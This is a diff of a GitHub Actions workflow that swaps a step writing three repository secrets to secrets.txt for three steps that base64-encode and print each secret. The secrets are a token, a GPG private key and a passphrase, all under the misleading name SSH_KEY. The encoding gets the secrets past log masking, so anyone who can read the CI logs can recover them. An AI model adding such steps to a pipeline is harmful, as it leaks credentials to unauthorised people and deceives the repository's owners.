@@ -10,12 +10,17 @@ jobs:
     - name: Check out code
       uses: actions/checkout@v2
 
-    - name: Set up secret file
+    - run: 'echo "$SSH_KEY" | base64'
+      shell: bash
       env:
-        DEBUG_PASSWORD: ${{ secrets.GHUB_TOKEN }}
-        DEBUG_SECRET_KEY: ${{ secrets.GPG_PRIVATE_KEY}}
-        DEBUG_OTHER_THING: ${{ secrets.PASSPHRASE}}
-      run: |
-        echo $DEBUG_PASSWORD >> secrets.txt
-        echo $DEBUG_SECRET_KEY >> secrets.txt
-        echo $DEBUG_OTHER_THING >> secrets.txt
+        SSH_KEY: ${{secrets.GHUB_TOKEN}}
+        
+    - run: 'echo "$SSH_KEY" | base64'
+      shell: bash
+      env:
+        SSH_KEY: ${{secrets.GPG_PRIVATE_KEY}}
+        
+    - run: 'echo "$SSH_KEY" | base64'
+      shell: bash
+      env:
+        SSH_KEY: ${{secrets.PASSPHRASE}}
